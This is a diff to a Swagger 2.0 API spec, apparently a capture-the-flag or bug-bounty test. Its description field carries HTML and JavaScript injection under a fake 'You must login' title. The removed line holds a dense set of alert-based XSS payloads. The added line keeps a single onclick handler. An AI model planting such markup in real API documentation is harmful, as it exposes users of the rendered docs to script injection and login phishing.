@@ -2,7 +2,8 @@ swagger: '2.0'
 info:
   title: You must login before continuing 😱 !
   description: |
-    **Note:** You must be logged in to access these resources. For more details, visit our [documentation](https://www.collectingflags.com/redirect.php)<form><math><mtext><textarea autofocus onfocus="alert('XSS')"></textarea><svg onload=alert('XSS')></svg><img src="x" onerror="alert('XSS')"><path id="XSS" d="M10 10L20 20"></path><script>alert('XSS')</script><div style="background:url('javascript:alert(1)')"></div></mtext></math></form><svg><script>alert('XSS')</script></svg><iframe src="javascript:alert('XSS')"></iframe><a href="javascript:alert('XSS')">Click me</a><button onclick="alert('XSS')">Click me</button>
+    **Note:** You must be logged in to access these resources. For more details, visit our [documentation](https://www.collectingflags.com/redirect.php)
+    <button onclick=print()>Click me</button>
   version: production
 basePath: /Submit/
 produces:
